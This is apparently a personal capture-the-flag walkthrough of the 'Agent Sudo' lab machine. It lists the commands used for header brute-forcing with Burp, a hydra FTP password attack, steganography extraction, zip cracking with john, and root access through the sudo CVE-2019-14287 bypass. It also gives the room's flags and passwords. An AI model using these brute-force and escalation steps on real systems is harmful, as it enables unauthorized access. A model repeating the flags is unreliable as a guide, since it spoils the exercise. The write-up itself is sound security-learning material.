====Agent Sudo Flutter July 24 2021====

'IP 10.10.219.45</br>
	$ export IP=10.10.219.45'</br>
'MYIP 10.10.213.35</br>
	$ export MYIP=10.10.213.35'

# Recon #

----------------
	Scanning
----------------

- nmap -sV -sC -T5 -oN nmap_initial $IP

		'''
		21/tcp open  ftp     vsftpd 3.0.3
		22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
		80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
			http-server-header: Apache/2.4.29 (Ubuntu)
			http-title: Annoucement
		'''

---------------------
	Visiting Site
---------------------

	'''
	Dear agents,

	Use your own codename as user-agent to access the site.

	From,
	Agent R 
	'''
Codename? Guessing the "Agent [letter]" is what they mean

- Intercepting with Burp
	> Sniper 
		>> target field: User-Agent 
		>> wordlist of a-zA-Z 
		>> don't exclude HTTP headers and grep for "10, 20, 30, 40, 50"
			//looking for "30" for redirects but more information is always nice
			< 1 redirect found! > User-Agent: C

	> Intercept
		>> set User-Agent: C

		 '''
		 Attention chris,
		
		 Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
		
		 From,
		 Agent R
		 '''


### Possible Users ###

- Chris
- R?
- J?


# Intrusion #

### ChrisFTP ###

- ftp $IP</br>
	Name: chris</br>
	Pass: crystal

ftp > ls

	'''
	-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
	-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
	-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
	'''
	
ftp > mget To_agentJ cute-alien.jpg cutie.png

ftp > exit


- To_agentJ.txt	

		'''
		Dear agent J,

		All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

		From,
		Agent C
		'''


### Steganography ###

- binwalk cutie.png -e
- ls _cutie.png.extracted

		'''
		365  365.zlib  8702.zip  To_agentR.txt
		'''
	8702.zip is password protected
		(see #Passwords#)

- 7z e 8702.zip
	> pass: alien
- To_agentR.txt

		'''
		Agent C,

		We need to send the picture to 'QXJlYTUx' as soon as possible!

		By,
		Agent R
		'''
	> QXJlYTUx
		(see #Passwords#)


- steghide extract -sf cute-alien.jpg > message.txt
	pass: Area51
		(see #Passwords#)
	

- message.txt

		'''
		Hi james,

		Glad you find this message. Your login password is hackerrules!

		Don't ask me why the password look cheesy, ask agent R who set this password for you.

		Your buddy,
		chris
		'''


### SSH ###

- ssh james@$IP
	pass: hackerrules!

- ls

		'''
		Alien_autospy.jpg  user_flag.txt
		'''

*Flag Found*<details>
	<summary>Spoiler</summary>
		/home/james/user_flag.txt: b03d975e8c92a7c04146cfa7a5a313c7
</details>


# PrivEsc #

- sudo -l
	> password protected, tried "hackerrules!" and succeeded
	
		"(ALL, !root) /bin/bash"

- searching "(ALL, !root) /bin/bash"</br>
		
		CVE: 2019-14287
		"sudo -u#-1 /bin/bash"

- root gained

*Flag Found*<details>
	<summary>Spoiler</summary>
	/root/root.txt: b53a02f55b57d4439e3341834d70c062
</details>


# Passwords #

----------------
	Cracking
----------------

- chris' ftp
	hydra -l chris -P rockyou.txt $IP ftp -o chris_pass
	pass: crystal

- 8702.zip
	zip2john steno/_cutie.png.extracted/8702.zip > 8702john
	john 8702john
	pass: alien

- QXJlYTUx
	CyberChef
	base64: Area51

---------------
	Exposed
---------------

- message.txt
	user: james
 	pass: hackerrules!
